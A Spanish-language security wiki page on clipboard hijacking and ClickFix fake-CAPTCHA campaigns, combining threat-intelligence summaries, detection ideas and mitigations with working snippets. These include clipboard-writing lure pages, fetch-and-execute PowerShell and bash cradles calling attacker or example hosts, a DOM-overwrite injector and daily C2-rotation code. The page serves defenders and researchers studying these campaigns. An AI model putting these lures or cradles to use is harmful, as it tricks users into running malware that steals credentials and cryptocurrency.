# Clipboard Hijacking (Pastejacking) Attacks

> "Nunca pegues nada que no hayas copiado tú mismo." – un consejo antiguo, pero todavía válido

## Descripción general

Clipboard hijacking – también conocido como *pastejacking* – aprovecha el hecho de que los usuarios copian y pegan comandos habitualmente sin inspeccionarlos. Una página web maliciosa (o cualquier contexto con capacidad para ejecutar JavaScript, como una aplicación de Electron o de escritorio) coloca mediante programación texto controlado por el atacante en el portapapeles del sistema. Normalmente, se anima a las víctimas, mediante instrucciones de ingeniería social cuidadosamente elaboradas, a pulsar **Win + R** (diálogo Ejecutar), **Win + X** (Acceso rápido / PowerShell), o abrir un terminal y *pegar* el contenido del portapapeles, ejecutando inmediatamente comandos arbitrarios.

Como **no se descarga ningún archivo ni se abre ningún adjunto**, la técnica evade la mayoría de los controles de seguridad de correo electrónico y contenido web que supervisan adjuntos, macros o la ejecución directa de comandos. Por ello, el ataque es popular en campañas de phishing que distribuyen familias de malware commodity como NetSupport RAT, el loader Latrodectus o Lumma Stealer.<sup>[[1]](#references)</sup>

## Clippers de reemplazo de direcciones de wallet

Otra variante de **clipboard hijacking** no pega comandos en absoluto: espera hasta que la víctima copia una **dirección de wallet de criptomonedas** y, justo antes de pegarla, la sustituye silenciosamente por una controlada por el atacante. Esto resulta especialmente eficaz contra formatos de wallet largos, porque los usuarios suelen verificar únicamente los primeros y últimos caracteres.<sup>[[8]](#references)</sup>

Características comunes en casos reales:
- **Loader ligero + payload anidado**: la aplicación/exe visible parece una herramienta legítima de trading o de "beneficios", mientras que el clipper real está oculto en una capa más profunda del bundle (por ejemplo, un loader de .NET que inicia un payload anidado de Rust).
- **Reemplazo basado en Regex**: el malware identifica cadenas como `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, o incluso cadenas genéricas de **44 caracteres similares a las de Solana**, y las reescribe con wallets del atacante.
- **Rotación de wallets a gran escala**: los samples modernos de Windows pueden incluir **miles** de wallets de reemplazo por moneda, en lugar de una única dirección estática, lo que reduce el desgaste de la reputación de la wallet después de cada robo.<sup>[[8]](#references)</sup>

### Flujo de un clipper en Windows

Una implementación común consiste en una ventana oculta registrada mediante **`AddClipboardFormatListener`**. En cada actualización del portapapeles, el malware normalmente llama a:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → acceder a los datos actuales del portapapeles.
- **`GetClipboardData`** → leer el texto.
- **`EmptyClipboard`** + **`SetClipboardData`** → reemplazar la cadena de la wallet por el valor del atacante.

Regexes mínimos de hunting que se observan con frecuencia en clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
La persistencia a nivel de usuario es suficiente para lograr impacto. Un patrón observado es:<sup>[[8]](#references)</sup>
- Copiar el payload a **`%APPDATA%\silke\silke.exe`**
- Crear un **LNK en la carpeta Startup** en `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideas de detección:
- Procesos que llaman continuamente a las APIs del clipboard mientras escriben en `%APPDATA%` y en la carpeta **Startup** del usuario.
- Creación de nuevos LNK/ejecutables seguida de reescrituras del clipboard de direcciones de wallet.
- Archivos comprimidos o bundles de software falso que contienen muchos archivos sin usar y un pequeño launcher que inicia un binario anidado.

### Eliminación de quarantine mediante ingeniería social en macOS + persistencia mediante LaunchAgent

En macOS, algunas campañas distribuyen un helper **`unlocker.command`** e indican a la víctima que haga clic derecho → **Abrir** si Gatekeeper indica que la aplicación está dañada o procede de un desarrollador no identificado. El script simplemente elimina quarantine e inicia la aplicación `.app` cercana:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Esto **no** es un exploit de **Gatekeeper**; es un **bypass de cuarentena mediante ingeniería social** que abusa del hecho de que las decisiones de Gatekeeper dependen del xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Tras la ejecución, el clipper puede persistir como el usuario actual escribiendo:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent con `RunAtLoad` y `KeepAlive`

Un detalle defensivo útil es que algunas muestras implementan un **watchdog self-healing** que vuelve a escribir el LaunchAgent y el wrapper cada ~30 segundos. Si eliminas primero el plist **sin matar el proceso en ejecución**, el malware puede recrearlo inmediatamente.<sup>[[8]](#references)</sup> Orden seguro de limpieza:
1. Mata el proceso activo del clipper.
2. Descarga/elimina el plist del LaunchAgent.
3. Elimina `~/launch.sh` y el payload copiado.

### Nota sobre la distribución: la reputación falsa como multiplicador de fuerza

Para esta familia, el malware puede mantenerse técnicamente simple mientras la **capa de distribución** hace el trabajo pesado: estrellas/forks falsos en GitHub, reseñas/descargas en SourceForge, comentarios/vistas de tutoriales en YouTube y comentarios/votos aparentemente benignos en VirusTotal se utilizan para que el binario parezca confiable antes de la ejecución.<sup>[[8]](#references)</sup>

## Botones de copia forzada y payloads ocultos (one-liners de macOS)

Algunos infostealers de macOS clonan sitios de instaladores (por ejemplo, Homebrew) y **obligan a usar un botón “Copy”** para que los usuarios no puedan seleccionar únicamente el texto visible. La entrada del clipboard contiene el comando de instalación esperado más un payload Base64 añadido (por ejemplo, `...; echo <b64> | base64 -d | sh`), de modo que un solo pegado ejecuta ambos mientras la UI oculta la etapa adicional.<sup>[[5]](#references)</sup>

## Proof-of-Concept de JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Las campañas antiguas usaban `document.execCommand('copy')`; las más recientes se basan en la **Clipboard API** asíncrona (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Flujo de ClickFix / ClearFake

1. El usuario visita un sitio typosquatted o comprometido (p. ej., `docusign.sa[.]com`)
2. El JavaScript **ClearFake** inyectado llama a un helper `unsecuredCopyToClipboard()` que almacena silenciosamente un one-liner de PowerShell codificado en Base64 en el portapapeles.
3. Las instrucciones HTML indican a la víctima: *“Presiona **Win + R**, pega el comando y presiona Enter para resolver el problema.”*
4. `powershell.exe` se ejecuta y descarga un archivo que contiene un ejecutable legítimo y una DLL maliciosa (classic DLL sideloading).
5. El loader descifra etapas adicionales, inyecta shellcode e instala persistence (p. ej., scheduled task), ejecutando finalmente NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Ejemplo de cadena de NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) busca en su directorio `msvcp140.dll`.
* La DLL maliciosa resuelve dinámicamente las APIs con **GetProcAddress**, descarga dos binarios (`data_3.bin`, `data_4.bin`) mediante **curl.exe**, los descifra usando una clave XOR rolling `"https://google.com/"`, inyecta el shellcode final y descomprime **client32.exe** (NetSupport RAT) en `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Descarga `la.txt` con **curl.exe**
2. Ejecuta el downloader JScript dentro de **cscript.exe**
3. Obtiene un payload MSI → coloca `libcef.dll` junto a una aplicación firmada → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer mediante MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La llamada a **mshta** inicia un script de PowerShell oculto que obtiene `PartyContinued.exe`, extrae `Boat.pst` (CAB), reconstruye `AutoIt3.exe` mediante `extrac32` y la concatenación de archivos, y finalmente ejecuta un script `.a3x` que exfiltra las credenciales del navegador a `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK con C2 rotativo (PureHVNC)

Algunas campañas de ClickFix omiten por completo las descargas de archivos e indican a las víctimas que peguen un one-liner que obtiene y ejecuta JavaScript mediante WSH, establece persistencia y rota el C2 diariamente. Cadena observada de ejemplo:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Características clave
- URL ofuscada invertida en tiempo de ejecución para evitar una inspección superficial.
- JavaScript se persiste mediante un Startup LNK (WScript/CScript) y selecciona el C2 según el día actual, lo que permite una rotación rápida de dominios.<sup>[[3]](#references)</sup>

Fragmento mínimo de JS utilizado para rotar los C2 según la fecha:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La siguiente etapa suele desplegar un loader que establece persistence y descarga un RAT (p. ej., PureHVNC), normalmente fijando TLS a un certificado hardcoded y fragmentando el tráfico.<sup>[[3]](#references)</sup>

Ideas de detección específicas para esta variante
- Árbol de procesos: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (o `cscript.exe`).
- Artefactos de inicio: un LNK en `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` que invoque WScript/CScript con una ruta JS bajo `%TEMP%`/`%APPDATA%`.
- Telemetría del registro/RunMRU y de la línea de comandos que contenga `.split('').reverse().join('')` o `eval(a.responseText)`.
- Ejecuciones repetidas de `powershell -NoProfile -NonInteractive -Command -` con grandes payloads por stdin para introducir scripts largos sin líneas de comandos extensas.
- Scheduled Tasks que posteriormente ejecuten LOLBins como `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` bajo una tarea/ruta con apariencia de updater (p. ej., `\GoogleSystem\GoogleUpdater`).

Caza de amenazas
- Hostnames y URLs de C2 que rotan diariamente, con el patrón `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlacionar eventos de escritura en el clipboard seguidos de un pegado mediante Win+R y la ejecución inmediata de `powershell.exe`.

Los equipos Blue Team pueden combinar la telemetría del clipboard, la creación de procesos y el registro para identificar el abuso de pastejacking:

* Registro de Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` conserva un historial de comandos de **Win + R**; buscar entradas inusuales en Base64 u ofuscadas.
* Security Event ID **4688** (Process Creation) cuando `ParentImage` == `explorer.exe` y `NewProcessName` pertenece a { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** para creaciones de archivos bajo `%LocalAppData%\Microsoft\Windows\WinX\` o carpetas temporales justo antes del evento 4688 sospechoso.
* Sensores de clipboard de EDR (si están disponibles): correlacionar `Clipboard Write` seguido inmediatamente por un nuevo proceso de PowerShell.

## Páginas de verificación estilo IUAM (ClickFix Generator): copia del clipboard a la consola + payloads adaptados al SO

Las campañas recientes producen masivamente páginas falsas de verificación de CDN/navegador ("Just a moment…", al estilo IUAM) que inducen a los usuarios a copiar comandos específicos del SO desde su clipboard a consolas nativas. Esto desvía la ejecución fuera del sandbox del navegador y funciona en Windows y macOS.<sup>[[4]](#references)</sup>

Características clave de las páginas generadas por el builder
- Detección del SO mediante `navigator.userAgent` para adaptar los payloads (Windows PowerShell/CMD frente a macOS Terminal). Señuelos/no-ops opcionales para sistemas operativos no compatibles, con el fin de mantener la ilusión.
- Copia automática al clipboard mediante acciones benignas de la interfaz de usuario (casilla de verificación/Copy), mientras que el texto visible puede diferir del contenido del clipboard.
- Bloqueo de móviles y un popover con instrucciones paso a paso: Windows → Win+R→pegar→Enter; macOS → abrir Terminal→pegar→Enter.
- Ofuscación opcional e injector de un solo archivo para sobrescribir el DOM de un sitio comprometido con una interfaz de verificación con estilo Tailwind (no requiere registrar un dominio nuevo).<sup>[[4]](#references)</sup>

Ejemplo: discrepancia del clipboard + branching adaptado al SO
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistencia de la ejecución inicial en macOS
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que la ejecución continúe después de cerrar la terminal, reduciendo los artefactos visibles.<sup>[[4]](#references)</sup>

Secuestro de páginas in situ en sitios comprometidos
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideas de detección y hunting específicas para lures de estilo IUAM
- Web: Páginas que vinculan la Clipboard API a widgets de verificación; discrepancia entre el texto mostrado y el payload del clipboard; bifurcación mediante `navigator.userAgent`; Tailwind + reemplazo de una sola página en contextos sospechosos.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` poco después de una interacción con el navegador; instaladores batch/MSI ejecutados desde `%TEMP%`.
- Endpoint macOS: Terminal/iTerm generando `bash`/`curl`/`base64 -d` con `nohup` cerca de eventos del navegador; jobs en segundo plano que sobreviven al cierre del terminal.
- Correlacionar el historial de `RunMRU` de Win+R y las escrituras en el clipboard con la posterior creación de procesos de consola.

Consulta también estas técnicas de apoyo

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Evoluciones de fake CAPTCHA / ClickFix de 2026 (ClearFake, Scarlet Goldfinch)

- ClearFake continúa comprometiendo sitios WordPress e inyectando JavaScript loader que encadena hosts externos (Cloudflare Workers, GitHub/jsDelivr) e incluso llamadas de “etherhiding” mediante blockchain (por ejemplo, POSTs a endpoints de la API de Binance Smart Chain como `bsc-testnet.drpc[.]org`) para obtener la lógica actual del lure. Los overlays recientes utilizan ampliamente fake CAPTCHAs que indican a los usuarios que copien/peguen un one-liner (T1204.004) en lugar de descargar algo.<sup>[[6]](#references)</sup>
- La ejecución inicial se delega cada vez más en hosts de scripts firmados/LOLBAS. Las cadenas de enero de 2026 sustituyeron el uso anterior de `mshta` por el `SyncAppvPublishingServer.vbs` incorporado, ejecutado mediante `WScript.exe`, pasando argumentos similares a PowerShell con alias/wildcards para obtener contenido remoto:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` está firmado y normalmente lo usa App-V; combinado con `WScript.exe` y argumentos inusuales (aliases `gal`/`gcm`, cmdlets con comodines y URLs de jsDelivr), se convierte en una etapa LOLBAS de alta señal para ClearFake.<sup>[[6]](#references)</sup>
- En febrero de 2026, los payloads de CAPTCHA falsos volvieron a usar download cradles puros de PowerShell. Dos ejemplos activos:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- La primera cadena es un grabber `iex(irm ...)` en memoria; la segunda utiliza `WinHttp.WinHttpRequest.5.1`, escribe un `.ps1` temporal y luego lo ejecuta con `-ep bypass` en una ventana oculta.<sup>[[6]](#references)</sup>

Consejos de detección y hunting para estas variantes
- Linaje de procesos: navegador → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` o cradles de PowerShell inmediatamente después de escrituras en el portapapeles o de Win+R.
- Palabras clave en la línea de comandos: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, dominios de jsDelivr/GitHub/Cloudflare Worker o patrones `iex(irm ...)` con IP sin formato.
- Red: conexiones salientes a hosts worker de CDN o endpoints RPC de blockchain desde hosts de scripts/PowerShell poco después de navegar por la web.
- Archivos/registro: creación de `.ps1` temporales en `%TEMP%`, además de entradas de RunMRU que contengan estos one-liners; bloquear/alertar cuando LOLBAS de scripts firmados (WScript/cscript/mshta) se ejecuten con URLs externas o cadenas de alias ofuscadas.

## Tradecraft de ClickFix de junio de 2026: telemetría de pegado, comentarios de verificación falsos y encadenamiento de LOLBin

La telemetría reciente de Red Canary muestra que el indicador estable **no es un comando exacto**, sino la combinación de **pegado y ejecución asistidos por el usuario**, **intérpretes/LOLBins de confianza**, **flags ofuscados**, **recuperación remota** y **ejecución inmediata**.<sup>[[7]](#references)</sup>

### Patrones destacados de los operadores

- **Telemetría de confirmación del pegado**: algunos payloads ejecutan `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` antes de la fase real. Esto confirma la interacción del usuario manteniendo la ventana breve y silenciosa.
- **Comentarios de verificación falsos**: los one-liners de PowerShell pueden añadir cadenas como `# Security check ✔️ I'm not a robot Verification ID: 138105`, de modo que el comando siga pareciendo relacionado con CAPTCHA después de pegarlo en Run / `cmd.exe` / el historial de PowerShell.
- **Reconstrucción dinámica de URL**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` evita incluir una URL estática en la línea de comandos, pero sigue realizando una descarga y ejecución en memoria.
- **Ejecución de instaladores disfrazados**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abusa de mayúsculas inusuales y caracteres similares a Unicode en los flags para evadir detecciones frágiles, aunque siga pareciendo `msiexec.exe`.
- **Cadenas de LOLBin con escapes de caret**: `cmd.exe` puede ocultar palabras clave mediante escapes `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), iniciar el shell anidado minimizado, guardar el contenido del atacante con una extensión benigna como `.pdf` y ejecutarlo después mediante `mshta`.<sup>[[7]](#references)</sup>
## Mitigaciones

1. Refuerzo del navegador: deshabilitar el acceso de escritura al portapapeles (`dom.events.asyncClipboard.clipboardItem`, etc.) o requerir un gesto del usuario.
2. Concienciación en seguridad: enseñar a los usuarios a *escribir* los comandos sensibles o pegarlos primero en un editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear one-liners arbitrarios.
4. Controles de red: bloquear solicitudes salientes a dominios conocidos de pastejacking y C2 de malware.

## Trucos relacionados

* **Discord Invite Hijacking** suele abusar del mismo enfoque de ClickFix después de atraer a los usuarios a un servidor malicioso:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Prevenir el ataque ClickFix: cómo evitar el vector de ataque ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PoC de Pastejacking – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Bajo la cortina pura: de RAT a builder y coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [La fábrica de ClickFix: primera exposición del generador de ClickFix de IUAM](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, el año del Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Perspectivas de inteligencia: febrero de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Perspectivas de inteligencia: junio de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – De estrellas a upvotes: reputación falsa para impulsar un Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
